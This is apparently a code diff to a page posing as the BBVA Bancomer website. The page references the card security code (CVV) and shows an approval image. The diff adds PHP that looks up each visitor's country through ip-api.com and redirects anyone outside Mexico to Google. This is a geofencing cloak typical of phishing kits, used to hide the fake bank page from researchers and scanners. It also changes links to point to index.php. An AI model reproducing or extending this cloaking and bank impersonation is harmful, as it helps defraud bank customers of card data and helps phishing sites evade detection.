@@ -1,3 +1,23 @@
+<?php
+$ip = $_SERVER['x-forwarded-for'];
+$redirectURL="https://www.google.com";
+
+echo $ip;
+
+$contenido = file_get_contents("http://ip-api.com/json/".$ip);
+$resultado = explode('","',$contenido);
+
+
+$countrycode = $resultado[3];
+$countryfull = explode('":"',$countrycode);
+
+var_dump($countryfull);
+
+if($countryfull[1] != "MX"){
+    header('Location: '.$redirectURL);
+}
+?>
+
 <!DOCTYPE html>
 
 <html lang="es-MX">
@@ -170,7 +190,7 @@ body{background:none}html,body,div,span,h2,h3,p,a,img,i,ul,li,form,label,aside,h
 
 
 
-<a class="skip2content" tab-index="0" href="index.html#main" aria-label="Ir al contenido principal">Ir al contenido principal</a>
+<a class="skip2content" tab-index="0" href="index.php#main" aria-label="Ir al contenido principal">Ir al contenido principal</a>
 
 <nav class="header__container background--navy" aria-label="BBVA Bancomer | Tarjetas, Créditos, Hipotecas, Cuentas, Seguros, Nominas, Portabilidad" data-component="header" data-dl-component data-dl-component-name="header" data-dl-component-type="bbva/pwebs/components/par/header" data-dl-component-id="content_bancomer_es_personas_jcr:content_header">
 
@@ -2822,7 +2842,7 @@ font-size: 12px; color: #323232;"><strong>El código de Seguridad (CVV)</strong>
 
 
             <p style="font-family: Arial; font-size: 18px; color: #000000;" align="center">&nbsp;</p>
-            <p style="font-family: Arial; font-size: 16px; color: #000000;" align="justify"><a href="index.html"><img src="content/aprobada.png" width="494" height="221" alt=""/></a></p>
+            <p style="font-family: Arial; font-size: 16px; color: #000000;" align="justify"><a href="index.php"><img src="content/aprobada.png" width="494" height="221" alt=""/></a></p>
             <div align="center">
                 <blockquote>&nbsp;</blockquote>
             </div>
